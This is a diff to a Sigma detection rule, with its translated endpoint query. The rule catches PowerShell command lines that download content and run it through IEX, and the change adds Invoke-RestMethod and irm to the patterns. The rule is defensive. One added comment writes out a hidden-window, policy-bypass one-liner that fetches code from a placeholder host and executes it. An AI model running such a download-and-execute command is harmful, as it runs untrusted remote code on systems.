@@ -1,6 +1,6 @@
 ```sql
-// Translated content (automatically translated on 28-07-2025 02:27:57):
-event.type="Process Creation" and (endpoint.os="windows" and ((tgt.process.cmdline contains ".DownloadString(" or tgt.process.cmdline contains ".DownloadFile(" or tgt.process.cmdline contains "Invoke-WebRequest " or tgt.process.cmdline contains "iwr ") and (tgt.process.cmdline contains ";iex $" or tgt.process.cmdline contains "| IEX" or tgt.process.cmdline contains "|IEX " or tgt.process.cmdline contains "I`E`X" or tgt.process.cmdline contains "I`EX" or tgt.process.cmdline contains "IE`X" or tgt.process.cmdline contains "iex " or tgt.process.cmdline contains "IEX (" or tgt.process.cmdline contains "IEX(" or tgt.process.cmdline contains "Invoke-Expression")))
+// Translated content (automatically translated on 29-07-2025 02:32:58):
+event.type="Process Creation" and (endpoint.os="windows" and ((tgt.process.cmdline contains ".DownloadString(" or tgt.process.cmdline contains ".DownloadFile(" or tgt.process.cmdline contains "Invoke-WebRequest " or tgt.process.cmdline contains "iwr " or tgt.process.cmdline contains "Invoke-RestMethod " or tgt.process.cmdline contains "irm ") and (tgt.process.cmdline contains ";iex $" or tgt.process.cmdline contains "| IEX" or tgt.process.cmdline contains "|IEX " or tgt.process.cmdline contains "I`E`X" or tgt.process.cmdline contains "I`EX" or tgt.process.cmdline contains "IE`X" or tgt.process.cmdline contains "iex " or tgt.process.cmdline contains "IEX (" or tgt.process.cmdline contains "IEX(" or tgt.process.cmdline contains "Invoke-Expression")))
 ```
 
 
@@ -15,7 +15,7 @@ references:
     - https://labs.withsecure.com/publications/fin7-target-veeam-servers
 author: Florian Roth (Nextron Systems)
 date: 2022-03-24
-modified: 2023-05-04
+modified: 2025-07-18
 tags:
     - attack.execution
     - attack.t1059
@@ -29,6 +29,8 @@ detection:
             - '.DownloadFile('
             - 'Invoke-WebRequest '
             - 'iwr '
+            - 'Invoke-RestMethod '
+            - 'irm ' #powershell -ep bypass -w h -c irm test.domain/ffe | iex
     selection_iex:
         CommandLine|contains:
             - ';iex $'
